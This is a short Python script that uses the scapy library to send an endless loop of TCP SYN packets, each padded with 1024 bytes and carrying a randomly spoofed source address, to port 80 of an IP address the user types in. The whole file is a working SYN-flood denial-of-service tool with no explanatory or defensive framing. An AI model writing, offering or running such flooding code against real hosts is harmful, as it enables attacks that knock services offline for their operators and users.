import scapy.all as scapy

target_ip = input("Enter IP adress: ")
target_port = 80 # int(input("Enter Port: "))
raw = scapy.Raw(b"X"*1024)

ip = scapy.IP(src=scapy.RandIP("172.24.6.1/24"), dst=target_ip)
tcp = scapy.TCP(sport=scapy.RandShort(), dport=target_port, flags="S")
p = ip / tcp / raw

scapy.send(p, loop=1, verbose=1)